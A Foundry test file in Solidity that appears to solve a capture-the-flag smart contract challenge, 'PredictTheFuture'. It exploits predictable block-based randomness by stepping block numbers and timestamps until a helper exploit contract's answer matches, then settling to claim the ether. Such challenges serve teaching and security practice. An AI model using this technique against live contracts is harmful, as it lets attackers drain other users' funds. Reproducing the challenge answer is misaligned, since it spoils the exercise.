// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/PredictTheFuture.sol";

contract PredictTheFutureTest is Test {
    PredictTheFuture public predictTheFuture;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheFuture = (new PredictTheFuture){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheFuture);
    }

    function testGuess() public {
        // Set block number and timestamp
        // Use vm.roll() and vm.warp() to change the block.number and block.timestamp respectively
        vm.roll(104293);
        vm.warp(93582192);

        // Put your solution here
        predictTheFuture.lockInGuess{value: 1 ether}(1);
        for (uint256 i = 0; i < 100; ++i) {
            vm.roll(104293 + i);
            vm.warp(93582192 + i * 15);
            if (exploitContract.doesAnswerMatch()) {
                predictTheFuture.settle();
                break;
            }
        }

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheFuture.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
